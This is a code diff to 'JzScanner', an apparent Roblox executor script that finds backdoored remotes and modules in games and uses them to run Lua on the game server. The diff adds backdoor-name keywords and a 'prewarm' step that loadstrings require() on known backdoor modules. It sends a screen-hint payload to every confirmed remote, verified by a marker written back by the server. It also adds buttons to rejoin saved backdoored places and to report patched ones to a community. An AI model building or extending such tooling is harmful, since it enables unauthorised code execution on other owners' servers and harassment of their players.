@@ -7,7 +7,7 @@ local SoundService = game:GetService("SoundService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerName = LocalPlayer.Name
 
-local VERSION = "5.1"
+local VERSION = "5.2"
 local BOOT_STAMP = os.date("%H:%M:%S")
 
 local ROOT_W = 470
@@ -93,6 +93,9 @@ local KEYWORDS = {
 	["exec"] = 4,
 	["execute"] = 4,
 	["eval"] = 4,
+	["run"] = 2,
+	["action"] = 2,
+	["event"] = 2,
 	["lalol"] = 4,
 	["k4"] = 4,
 	["bd"] = 3,
@@ -1138,6 +1141,15 @@ end
 local function rebuildTargets()
 	local paths = { "LOCAL" }
 	local refs = { nil }
+	-- prewarm: known backdoor modules execute payload on require, so the
+	-- marker surfaces without waiting for the remote round-trip
+	for _, rq in ipairs(State.requires) do
+		local g = newGuid()
+		rq.prewarmGuid = g
+		pcall(function()
+			loadstring(('require(%s)("%s") '):format(rq.id, PlayerName) .. markerPayload("JZR_", g))()
+		end)
+	end
 	for _, r in ipairs(State.results) do
 		if r.hits > 0 or State.resultFilter == "ALL" then
 			local ok, full = pcall(function()
@@ -1985,7 +1997,7 @@ local function renderHistory()
 			Text = #e.remotes
 				.. " usable remote(s) · "
 				.. (#e.reqs > 0 and (#e.reqs .. " reqs · ") or "")
-				.. os.date("%d.%m.%Y %H:%M", e.last),
+				.. ((e.last and e.last > 0) and os.date("%d.%m.%Y %H:%M", e.last) or "earlier save"),
 			TextColor3 = THEME.dim,
 			TextSize = 9,
 			Font = Enum.Font.Code,
@@ -2006,8 +2018,8 @@ local function renderHistory()
 			Parent = row,
 		})
 		local copyB = create("TextButton", {
-			Size = UDim2.new(0, 92, 0, 26),
-			Position = UDim2.new(1, -160, 0.5, -13),
+			Size = UDim2.new(0, 50, 0, 26),
+			Position = UDim2.new(1, -212, 0.5, -13),
 			BackgroundColor3 = THEME.accent,
 			Text = "COPY",
 			TextColor3 = Color3.fromRGB(8, 10, 12),
@@ -2019,11 +2031,25 @@ local function renderHistory()
 		})
 		corner(copyB, 6)
 		hoverify(copyB, THEME.accent, Color3.fromRGB(0, 190, 172))
-		local delB = create("TextButton", {
-			Size = UDim2.new(0, 54, 0, 26),
-			Position = UDim2.new(1, -60, 0.5, -13),
+		local joinB = create("TextButton", {
+			Size = UDim2.new(0, 50, 0, 26),
+			Position = UDim2.new(1, -156, 0.5, -13),
+			BackgroundColor3 = THEME.good,
+			Text = "JOIN",
+			TextColor3 = Color3.fromRGB(8, 14, 10),
+			TextSize = 10,
+			Font = Enum.Font.GothamBold,
+			BorderSizePixel = 0,
+			AutoButtonColor = false,
+			Parent = row,
+		})
+		corner(joinB, 6)
+		hoverify(joinB, THEME.good, Color3.fromRGB(45, 165, 90))
+		local reportB = create("TextButton", {
+			Size = UDim2.new(0, 92, 0, 26),
+			Position = UDim2.new(1, -98, 0.5, -13),
 			BackgroundColor3 = THEME.bad,
-			Text = "DEL",
+			Text = "REPORT",
 			TextColor3 = Color3.new(1, 1, 1),
 			TextSize = 10,
 			Font = Enum.Font.GothamBold,
@@ -2031,8 +2057,8 @@ local function renderHistory()
 			AutoButtonColor = false,
 			Parent = row,
 		})
-		corner(delB, 6)
-		hoverify(delB, THEME.bad, Color3.fromRGB(120, 40, 48))
+		corner(reportB, 6)
+		hoverify(reportB, THEME.bad, Color3.fromRGB(120, 40, 48))
 
 		bindClick(copyB, function()
 			local lines = { "# JzScanner — " .. (e.name or ("Place " .. tostring(e.placeId))) }
@@ -2051,10 +2077,46 @@ local function renderHistory()
 				toast("No clipboard API", "This executor lacks setclipboard.", THEME.warn)
 			end
 		end)
-		bindClick(delB, function()
+		bindClick(joinB, function()
+			local pid = tonumber(e.placeId)
+			if not pid or pid == 0 then
+				toast("Can't join", "Saved entry has no valid place id.", THEME.warn)
+				return
+			end
+			local ok, err = pcall(function()
+				game:GetService("TeleportService"):Teleport(pid, LocalPlayer)
+			end)
+			if ok then
+				toast("JOINING", (e.name or ("Place " .. pid)), THEME.good)
+				log("INFO", "teleporting to saved game #" .. tostring(pid))
+			else
+				toast("Teleport blocked", tostring(err), THEME.bad)
+				log("BAD", "teleport failed: " .. tostring(err))
+			end
+		end)
+		bindClick(reportB, function()
+			reportB.Text = "..."
+			local report = table.concat({
+				"JzScanner report — backdoor no longer works",
+				"place: " .. tostring(e.placeId) .. " " .. tostring(e.name or "?"),
+				"reported by: " .. PlayerName .. " (" .. tostring(LocalPlayer.UserId) .. ")",
+				"remotes that used to work:",
+				table.concat(e.remotes, "\n"),
+			}, "\n")
+			if copyText(report) then
+				toast("Report copied", "Paste it in the community discord/repo.", THEME.warn)
+				log("INFO", "report for #" .. tostring(e.placeId) .. " copied to clipboard")
+			else
+				toast("No clipboard", "Report: place " .. tostring(e.placeId) .. " is patched.", THEME.warn)
+			end
 			History.Remove(e.placeId)
 			renderHistory()
-			log("INFO", "removed saved game #" .. tostring(e.placeId))
+			log("INFO", "removed patched game #" .. tostring(e.placeId) .. " from saved list")
+			task.delay(0.6, function()
+				pcall(function()
+					reportB.Text = "REPORT"
+				end)
+			end)
 		end)
 	end
 	if #all == 0 then
@@ -2604,34 +2666,67 @@ end
 
 bindClick(UI.ExecBtn, executeCurrent)
 
+-- every confirmed remote gets the hint payload; delivery is proven with a
+-- marker appended to the payload so "HINT (local)" only shows when nothing
+-- actually ran server-side
+local function confirmedRemotes()
+	local out = {}
+	local seen = {}
+	for _, m in ipairs(State.results) do
+		if m.hits > 0 and m.remote and not seen[m.remote] then
+			seen[m.remote] = true
+			table.insert(out, { remote = m.remote, shape = m.workingShape })
+		end
+	end
+	return out
+end
+
 local function hintBroadcast(message)
 	task.spawn(function()
-		-- the hint is written on everyone's screen (Hint/Message), never through
-		-- our own chat — it goes through the confirmed backdoor remote
-		local ref, shape = bestConfirmedRemote()
-		if ref then
-			local payload = screenHintPayload(message)
-			local shapes
-			if shape then
-				local shaped = applyWorkingShape(shape, payload)
-				shapes = (type(shaped) == "string" and shaped == payload) and { payload } or { shaped, payload }
-			else
-				shapes = probeVariants(payload)
+		local targets = confirmedRemotes()
+		if #targets == 0 then
+			log("WARN", "no confirmed remote — hint shown locally only")
+			toast("HINT (local)", message, THEME.warn)
+			return
+		end
+		local g = newGuid()
+		local payload = screenHintPayload(message) .. " " .. markerPayload("JZH_", g)
+		local delivered = false
+		local conn
+		conn = workspace.AttributeChanged:Connect(function(attr)
+			if attr == "JZH_" .. g then
+				delivered = true
 			end
+		end)
+		for _, t in ipairs(targets) do
+			local shaped = t.shape and applyWorkingShape(t.shape, payload) or payload
+			local shapes = (type(shaped) == "string" and shaped == payload) and { payload } or { shaped, payload }
 			for _, s in ipairs(shapes) do
-				local ok = sendPayload(ref, s)
-				if ok then
-					log("GOOD", "hint written on all screens via " .. ref.Name)
-					toast("HINT SHOWN", message, THEME.good)
-					return
-				end
+				pcall(sendPayload, t.remote, s)
 				task.wait()
 			end
-			log("WARN", "hint payload rejected by " .. ref.Name .. " — shown locally only")
-		else
-			log("WARN", "no confirmed remote — hint shown locally only")
+			log("INFO", "hint payload sent -> " .. t.remote.Name)
 		end
-		toast("HINT (local)", message, THEME.warn)
+		-- wait for the server to write the marker back
+		local deadline = os.clock() + CONFIG.ExecConfirmWindow
+		while os.clock() < deadline and not delivered do
+			if markerExists("JZH_", g) then
+				delivered = true
+				break
+			end
+			task.wait(0.25)
+		end
+		pcall(function()
+			conn:Disconnect()
+		end)
+		if delivered then
+			log("GOOD", "hint shown on ALL screens (server-confirmed)")
+			toast("HINT SHOWN TO ALL", message, THEME.good)
+			playSound()
+		else
+			log("WARN", "hint unconfirmed — shown locally only")
+			toast("HINT (local)", message, THEME.warn)
+		end
 	end)
 end
 
@@ -2659,10 +2754,6 @@ local function markFound(m)
 		renderResults()
 		rebuildTargets()
 		task.spawn(History.Record, tostring(fullPath), m.remote.ClassName)
-		if State.settings.autoHint and not State.hintSentThisScan then
-			State.hintSentThisScan = true
-			hintBroadcast(CONFIG.HintMessage)
-		end
 	end
 	m.hits = m.hits + 1
 end
@@ -3037,6 +3128,11 @@ local function runScanCore()
 		setStatus(("DONE — %d confirmed backdoor(s)! Open EXEC."):format(#confirmedList))
 		log("GOOD", "scan done: " .. #confirmedList .. " confirmed in " .. string.format("%.1fs", elapsed))
 		History.AttachRequires(reqList)
+		-- auto-hint after the whole scan so every confirmed remote gets it
+		if State.settings.autoHint and not State.hintSentThisScan then
+			State.hintSentThisScan = true
+			hintBroadcast(CONFIG.HintMessage)
+		end
 		-- jump the EXEC target straight onto the strongest confirmed remote so
 		-- require/lua runs server-side without the user touching anything
 		local best = bestConfirmedRemote()
